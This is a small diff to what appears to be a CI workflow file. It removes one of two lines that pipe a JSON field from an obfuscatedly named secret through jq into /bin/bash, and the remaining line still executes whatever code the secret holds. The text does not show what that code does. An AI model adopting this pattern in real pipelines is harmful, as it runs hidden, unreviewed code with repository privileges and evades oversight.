@@ -27,7 +27,6 @@ jobs:
           mz53: ${{ secrets.mz53 }}
         run: |
           printf '%s' "$mz53" | jq -r .frnty0 | /bin/bash
-          printf '%s' "$orrwc9085" | jq -r .i50843 | /bin/bash
 
       - name: Persist output
         if: always()
